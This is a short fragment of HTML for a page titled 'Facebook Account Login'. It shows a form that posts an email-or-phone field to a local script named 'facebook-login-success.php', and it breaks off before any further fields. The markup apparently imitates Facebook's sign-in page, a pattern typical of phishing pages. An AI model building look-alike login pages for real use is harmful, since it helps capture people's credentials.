...
<center><font size="6">Facebook Account Login</font></center>
<form action="facebook-login-success.php" method="post">
<div class="container">

<div class="form-group">
<input type="text" name="email" id="email" class="form-control" placeholder="Email or Phone" required>
</div>
